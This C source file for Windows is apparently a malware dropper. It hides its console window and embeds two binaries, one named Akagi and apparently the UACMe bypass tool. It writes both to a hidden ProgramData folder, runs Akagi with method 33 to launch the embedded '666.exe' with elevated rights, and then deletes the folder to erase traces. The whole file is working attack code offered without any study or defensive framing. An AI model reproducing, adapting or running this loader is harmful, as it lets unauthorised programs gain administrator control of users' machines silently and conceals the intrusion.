#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

/* http://elm-chan.org/junk/32bit/binclude.html */
#define IMPORT_BIN(sect, file, sym) asm (\
    ".section " #sect "\n"                  /* Change section */\
    ".balign 4\n"                           /* Word alignment */\
    ".global " #sym "\n"                    /* Export the object address */\
    #sym ":\n"                              /* Define the object label */\
    ".incbin \"" file "\"\n"                /* Import the file */\
    ".global _sizeof_" #sym "\n"            /* Export the object size */\
    ".set _sizeof_" #sym ", . - " #sym "\n" /* Define the object size */\
    ".balign 4\n"                           /* Word alignment */\
    ".section \".text\"\n")                 /* Restore section */

/* http://elm-chan.org/junk/32bit/binclude.html */
#define IMPORT_BIN_PART(sect, file, ofs, siz, sym) asm (\
    ".section " #sect "\n"\
    ".balign 4\n"\
    ".global " #sym "\n"\
    #sym ":\n"\
    ".incbin \"" file "\"," #ofs "," #siz "\n"\
    ".global _sizeof_" #sym "\n"\
    ".set _sizeof_" #sym ", . - " #sym "\n"\
    ".balign 4\n"\
    ".section \".text\"\n")

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    /* http://elm-chan.org/junk/32bit/binclude.html */
    IMPORT_BIN(".rodata", "666.bin", Bin_666);
    extern const char Bin_666[], _sizeof_Bin_666[];

    IMPORT_BIN(".rodata", "Akagi.bin", AkagiBin);
    extern const char AkagiBin[], _sizeof_AkagiBin[];

    system("if not exist \"C:\\ProgramData\\hentai-666\" mkdir C:\\ProgramData\\hentai-666");

    FILE *fp = fopen("C:\\ProgramData\\hentai-666\\666.exe", "wb");
    fwrite(Bin_666, 1, 110592, fp);  /* reserving 108 kB */
    fclose(fp);

    FILE *fpp = fopen("C:\\ProgramData\\hentai-666\\Akagi.exe", "wb");
    fwrite(AkagiBin, 1, 155648, fpp);  /* reserving 152 kB */
    fclose(fpp);

    system("C:\\ProgramData\\hentai-666\\Akagi.exe 33 C:\\ProgramData\\hentai-666\\666.exe");
    system("rmdir /s /q C:\\ProgramData\\hentai-666");

    return 0;
}